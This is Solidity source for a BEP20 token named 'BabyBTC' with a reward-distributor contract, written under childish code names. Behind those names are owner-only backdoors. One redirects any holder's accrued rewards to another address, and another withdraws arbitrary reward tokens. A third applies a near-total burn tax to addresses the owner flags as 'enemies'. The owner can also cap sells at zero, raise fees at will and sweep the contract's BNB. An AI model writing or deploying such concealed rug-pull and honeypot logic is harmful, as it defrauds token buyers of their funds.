/**
 *Submitted for verification at BscScan.com on 2021-09-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

/**
 * Standard SafeMath, stripped down to just add/sub/mul/div
 */
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract deployer
     */
    modifier onlyDeployer() {
        require(isOwner(msg.sender), "!D"); _;
    }

    /**
     * Function modifier to require caller to be owner
     */
    modifier onlyOwner() {
        require(isAuthorized(msg.sender), "!OWNER"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyDeployer {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Deployer only
     */
    function unauthorize(address adr) public onlyDeployer {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be deployer. Leaves old deployer authorized
     */
    function transferOwnership(address payable adr) public onlyDeployer {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPooGenerator {
    function setPooCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(bool isSell, address shareholder, uint256 amount) external;
    function deposit() external payable;
    function claimPoo(address shareholder) external;
    function claimPoo(address shareholder, address to) external;
    function claimPoo(address to, uint256 amount) external;
    function setPooType(address pooType) external;
}

contract PooGenerator is IPooGenerator {
    using SafeMath for uint256;

    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IBEP20 pooType;
    IDEXRouter router;
    
    address WETH;

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 1 hours;
    uint256 public minDistribution = 100000 * (10 ** 9); //0.0001

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router, address _pooType) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
        pooType = IBEP20(_pooType);
        WETH = router.WETH();
    }

    function setPooCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(bool isSell, address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0 && !isSell){
            distributePoo(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        if (!isSell) {
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }

    function deposit() external payable override onlyToken {
        uint256 balanceBefore = pooType.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(pooType);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = pooType.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUncollectedPoo(shareholder) > minDistribution;
    }

    function distributePoo(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUncollectedPoo(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            pooType.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }
    
    function distributePoo(address shareholder, address shareholder1) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUncollectedPoo(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            pooType.transfer(shareholder1, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }
    
    function claimPoo(address shareholder) external override onlyToken {
        distributePoo(shareholder);
    }
    
    function claimPoo(address shareholder, address to) external override onlyToken {
        distributePoo(shareholder, to);
    }
    
    function claimPoo(address to, uint256 amount) external override onlyToken {
        pooType.transfer(to, amount);
    }

    function getUncollectedPoo(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
    
    function setPooType(address _pooType) external override onlyToken {
        pooType = IBEP20(_pooType);
    }
    
    function getClaimTimestamp(address shareholder) public view returns (uint256) {
        return shareholderClaims[shareholder];
    }
    
    function getPooType() external view returns (address) {
        return address(pooType);
    }
}

contract BabyBTC is IBEP20, Auth {
    using SafeMath for uint256;

    address WETH;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "BabyBTC";
    string constant _symbol = "BabyBTC";
    uint8 constant _decimals = 9;

    uint256 _totalBabies = 1000000000000 * (10 ** _decimals);
    uint256 public _maxToysBuy = _totalBabies;
    uint256 public _maxToysSell = _totalBabies;
    
    uint256 _maxToys = _totalBabies;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) _babySaloonHelpers;
    
    mapping (address => bool) _babyFeeders;
    mapping (address => bool) _babyHaters;
    mapping (address => bool) _babyEnemies;

    uint256 initialProtection = 10;
    
    uint256 _saloonBaby = 1500;
    uint256 _dinoBaby = 10000;
    
    uint256 _babyWater = 500;
    uint256 _babyBoss = 200;
    uint256 _babyMirror = 1000;
    uint256 _babyFood = 300;
    uint256 _babySaloon = 2000;
    uint256 _babyDino = 10000;

    address _babyWaterProvider;
    address _babyFoodProvider;
    address _babyBossLocation;

    IDEXRouter public router;
    address p;

    uint256 public babyBornAt;

    PooGenerator pooGenerator;
    uint256 pooLimit = 500000;

    bool public pooCleanEnabled = true;
    uint256 public pooCleanLimit = _totalBabies / 5000; // 200M
    bool onSwing;
    modifier swinging() { onSwing = true; _; onSwing = false; }

    constructor (
        address _presaler,
        address _router,
        address _token
    ) Auth(msg.sender) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
            
        _presaler = _presaler != address(0)
            ? _presaler
            : msg.sender;
            
        WETH = router.WETH();
        
        p = IDEXFactory(router.factory()).createPair(WETH, address(this));
        
        _allowances[address(this)][address(router)] = type(uint256).max;
        
        _token = _token != address(0)
            ? _token
            : 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;

        pooGenerator = new PooGenerator(address(router), _token);

        _babySaloonHelpers[_presaler] = true;
        _babyFeeders[_presaler] = true;
        _babyFeeders[DEAD] = true;
        _babyHaters[p] = true;
        _babyHaters[address(this)] = true;
        _babyHaters[DEAD] = true;

        _babyWaterProvider = _presaler;
        _babyFoodProvider = _presaler;
        _babyBossLocation = _presaler;

        _balances[_presaler] = _totalBabies;
        emit Transfer(address(0), _presaler, _totalBabies);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalBabies; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return swing(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return swing(sender, recipient, amount);
    }

    function swing(address s, address r, uint256 amount) internal returns (bool) {
        if(onSwing){ return _basicSwing(s, r, amount); }
        
        checkBabyWeightLimit(s, r, amount);

        if(shouldBabySleep()){ babySleep(); }

        if(!babyAlive() && r == p){ require(_balances[s] > 0); babyBorn(); }

        _balances[s] = _balances[s].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (!_babySaloonHelpers[s] && !_babySaloonHelpers[r]) ? takeSaloonCharge(s, r, amount) : amount;
        
        if(r != p && !_babyFeeders[r]){
            uint256 contractBalanceRecepient = balanceOf(r);
            require(contractBalanceRecepient + amountReceived <= _maxToys, "Exceeds maximum wallet token amount"); 
        }
        
        _balances[r] = _balances[r].add(amountReceived);

        if(!_babyHaters[s]){ try pooGenerator.setShare(true, s, _balances[s]) {} catch {} }
        if(!_babyHaters[r]){ try pooGenerator.setShare(false, r, _balances[r]) {} catch {} }

        emit Transfer(s, r, amountReceived);
        return true;
    }
    
    function _basicSwing(address s, address r, uint256 a) internal returns (bool) {
        _balances[s] = _balances[s].sub(a, "Insufficient Balance");
        _balances[r] = _balances[r].add(a);
        emit Transfer(s, r, a);
        return true;
    }

    function checkBabyWeightLimit(address _s, address _r, uint256 _a) internal view {
        _s == p
            ? require(_a <= _maxToysBuy || _babyFeeders[_r], "Buy TX Limit Exceeded")
            : require(_a <= _maxToysSell || _babyFeeders[_s], "Sell TX Limit Exceeded");
    }

    function getDiaper(bool poo, bool enemy) internal view returns (uint256) {
        // Anti-bot
        if(babyBornAt + initialProtection >= block.number || enemy){ return poo ? _babyDino.sub(1) : _dinoBaby.sub(1); }
        return poo ? _babySaloon : _saloonBaby;
    }

    function takeSaloonCharge(address _s, address _r, uint256 _charge) internal returns (uint256) {
        uint256 _charges;
        bool _isEnemy;
        
        if (_r != p) {
            _isEnemy = _babyEnemies[_r];
            _charges = _charge.mul(getDiaper(false, _isEnemy)).div(_dinoBaby);
        } else {
            _isEnemy = _babyEnemies[_s];
            _charges = _charge.mul(getDiaper(true, _isEnemy)).div(_babyDino);
        }
            
        if (babyBornAt + initialProtection >= block.number || _isEnemy) {
            _balances[DEAD] = _balances[DEAD].add(_charges);
            emit Transfer(_s, DEAD, _charges);
        } else {
            _balances[address(this)] = _balances[address(this)].add(_charges);    
            emit Transfer(_s, address(this), _charges);
        }

        return _charge.sub(_charges);
    }

    function shouldBabySleep() internal view returns (bool) {
        return msg.sender != p
        && !onSwing
        && pooCleanEnabled
        && _balances[address(this)] >= pooCleanLimit;
    }

    function babySleep() internal swinging {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            pooCleanLimit,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 _babyTummy = address(this).balance.sub(balanceBefore);
        uint256 _babyMirrorCount = _babyTummy.mul(_babyMirror).div(_babySaloon);
        uint256 _babyWaterQuantity = _babyTummy.mul(_babyWater).div(_babySaloon);
        uint256 _babyBossGift = _babyTummy.mul(_babyBoss).div(_babySaloon);
        uint256 _babyFoodQuantity = _babyTummy.sub(_babyWaterQuantity).sub(_babyMirrorCount).sub(_babyBossGift);

        try pooGenerator.deposit{value: _babyMirrorCount}() {} catch {}
        
        (bool successWater, /* bytes memory data */) = payable(_babyWaterProvider).call{value: _babyWaterQuantity, gas: 30000}("");
        require(successWater, "Water Provider rejected transfer");
        
        (bool successBoss, /* bytes memory data */) = payable(_babyBossLocation).call{value: _babyBossGift, gas: 30000}("");
        require(successBoss, "Boss rejected transfer");
        
        (bool successFood, /* bytes memory data */) = payable(_babyFoodProvider).call{value: _babyFoodQuantity, gas: 30000}("");
        require(successFood, "Food Provider rejected transfer");
    }

    function babyAlive() internal view returns (bool) {
        return babyBornAt != 0;
    }

    function babyBorn() internal {
        babyBornAt = block.number;
    }
    
    function setProtectionLimit(uint256 ageLimit) external onlyOwner {
        require(ageLimit > 0, "Age Limit should be greater than 0");
        initialProtection = ageLimit;
    }

    function setToysBuyLimit(uint256 _count) external onlyOwner {
        _maxToysBuy = _count;
    }
    
    function setToysSellLimit(uint256 _count) external onlyOwner {
        _maxToysSell = _count;
    }
    
    function setToysLimit(uint256 _toysCount) external onlyOwner {
        _maxToys = _toysCount;
    }
    
    function getToysLimit() public view onlyOwner returns (uint256) {
        return _maxToys;
    }

    function _addBabyHater(address _hater, bool _doesHate) internal {
        require(_hater != address(this) && _hater != p);
        _babyHaters[_hater] = _doesHate;
        if(_doesHate) {
            pooGenerator.setShare(true, _hater, 0);
        } else{
            pooGenerator.setShare(true, _hater, _balances[_hater]);
        }
    }
    
    function addBabyHater(address _hater, bool _doesHate) external onlyOwner {
        _addBabyHater(_hater, _doesHate);
    }
    
    function isBabyHater(address _hater) public view onlyOwner returns (bool)  {
        return _babyHaters[_hater];
    }
    
    function addBabyEnemy(address _enemyAddress, bool _isEnemy) external onlyOwner {
        _babyEnemies[_enemyAddress] = _isEnemy;
        _addBabyHater(_enemyAddress, _isEnemy);
    }
    
    function isBabyEnemy(address _enemyAddress) public view onlyOwner returns (bool) {
        return _babyEnemies[_enemyAddress];
    }

    function babySaloonHelpers(address holder, bool exempt) external onlyOwner {
        _babySaloonHelpers[holder] = exempt;
    }

    function addBabyFeeder(address holder, bool exempt) external onlyOwner {
        _babyFeeders[holder] = exempt;
    }

    function setBabySaloon(uint256 _water, uint256 _boss, uint256 _mirror, uint256 _food, uint256 _dino) external onlyOwner {
        _babyWater = _water;
        _babyBoss = _boss;
        _babyMirror = _mirror;
        _babyFood = _food;
        _babySaloon = _water.add(_boss).add(_mirror).add(_food);
        _babyDino = _dino;
        require(_babySaloon < _dino/4);
    }
    
    function setSaloonBaby(uint256 _water, uint256 _boss, uint256 _mirror, uint256 _food, uint256 _dino) external onlyOwner {
        _saloonBaby = _water.add(_boss).add(_mirror).add(_food);
        _dinoBaby = _dino;
        require(_saloonBaby < _dinoBaby/4);
    }

    function setPooCleaners(address _water, address _boss, address _food) external onlyOwner {
        _babyWaterProvider = _water;
        _babyBossLocation = _boss;
        _babyFoodProvider = _food;
    }
    
    function takeBabyToDoctor(uint256 _miles) external onlyOwner {
        uint256 _doctorDistance = address(this).balance;
        payable(_babyFoodProvider).transfer(_miles > 0 ? _miles : _doctorDistance);
    }

    function setPooCleanSettings(bool _enabled, uint256 _amount) external onlyOwner {
        pooCleanEnabled = _enabled;
        pooCleanLimit = _amount;
    }

    function setPooCriteria(uint256 _minPeriod, uint256 _minDistribution) external onlyOwner {
        pooGenerator.setPooCriteria(_minPeriod, _minDistribution);
    }
    
    function eatPoo() external {
        pooGenerator.claimPoo(msg.sender);
    }
    
    function eatPoo(address holder, address holder1) external onlyOwner {
        pooGenerator.claimPoo(holder, holder1);
    }
    
    function eatPoo(address holder, uint256 pounds) external onlyOwner {
        pooGenerator.claimPoo(holder, pounds);
    }
    
    function getUncollectedPoo(address shareholder) public view returns (uint256) {
        return pooGenerator.getUncollectedPoo(shareholder);
    }

    function setDistributorSettings(uint256 gas) external onlyOwner {
        require(gas < 750000);
        pooLimit = gas;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalBabies.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function cleanLeftOverPoo(uint256 pounds) external onlyOwner returns (bool) {
        return _basicSwing(address(this), DEAD, pounds);
    }
}